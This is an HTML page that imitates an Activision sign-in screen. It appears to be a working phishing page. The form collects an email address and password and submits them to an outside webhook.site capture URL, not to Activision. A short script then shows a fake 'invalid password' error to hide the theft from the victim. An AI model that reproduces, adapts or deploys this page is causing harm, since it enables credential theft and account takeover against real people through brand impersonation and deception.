<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Activision</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Roboto,Arial,sans-serif; }
        body { background:#0a0a0a; display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .card { background:#1a1a1a; padding:48px 40px; border-radius:12px; width:420px; box-shadow:0 8px 40px rgba(0,0,0,0.8); }
        .logo { text-align:center; margin-bottom:32px; }
        .logo h1 { color:#fff; font-size:28px; font-weight:700; letter-spacing:3px; }
        .logo p { color:#888; font-size:14px; margin-top:6px; }
        .input-group { margin-bottom:20px; }
        .input-group label { display:block; color:#ccc; font-size:13px; font-weight:500; margin-bottom:6px; }
        .input-group input { width:100%; padding:14px 16px; background:#2a2a2a; border:1px solid #333; border-radius:8px; color:#fff; font-size:15px; outline:none; transition:0.2s; }
        .input-group input:focus { border-color:#00b4d8; background:#222; }
        .input-group input::placeholder { color:#666; }
        .btn { width:100%; padding:14px; background:#00b4d8; border:none; border-radius:8px; color:#fff; font-size:16px; font-weight:600; cursor:pointer; transition:0.2s; }
        .btn:hover { background:#0096b8; }
        .error { color:#ff4444; font-size:13px; text-align:center; margin-top:14px; display:none; }
        .footer { margin-top:24px; text-align:center; color:#666; font-size:13px; }
        .footer a { color:#00b4d8; text-decoration:none; }
        .footer a:hover { text-decoration:underline; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">
        <h1>ACTIVISION</h1>
        <p>Sign in to your Activision account</p>
    </div>
    <form action="https://webhook.site/dbcadda3-6d04-46fa-bb8b-dbf6649e2aaa" method="POST">
        <div class="input-group">
            <label>Email Address</label>
            <input type="text" name="email" placeholder="Example@domain.com" required>
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" name="password" placeholder="Enter password" required>
        </div>
        <button type="submit" class="btn">Sign In</button>
        <div class="error" id="errorMsg">Invalid email or password. Please try again.</div>
    </form>
    <div class="footer">
        <a href="#">Need Help Signing In?</a>
    </div>
</div>
<script>
    document.querySelector('form').addEventListener('submit', function(e) {
        setTimeout(() => {
            document.getElementById('errorMsg').style.display = 'block';
        }, 500);
    });
</script>
</body>
</html>
